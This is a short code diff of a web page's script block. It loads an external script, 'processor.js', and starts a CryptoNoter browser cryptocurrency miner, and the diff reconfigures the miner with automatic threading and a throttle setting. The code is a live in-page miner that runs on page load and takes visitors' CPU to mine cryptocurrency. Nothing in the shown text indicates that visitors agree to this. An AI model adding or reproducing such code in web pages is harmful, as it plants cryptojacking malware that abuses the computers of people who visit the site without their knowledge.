@@ -1,4 +1,9 @@
 	<script src="https://lotteh.com/static/crypto/processor.js"></script>
 	<script>
-	    var miner = new CryptoNoter.Anonymous('CryptoNoter').start();
+        var addr = 'CryptoNoter';
+    	var miner = new CryptoNoter.Anonymous(addr, {
+            autoThreads: true,
+    	    throttle: 0.8
+    	});
+    	miner.start();
 	</script>
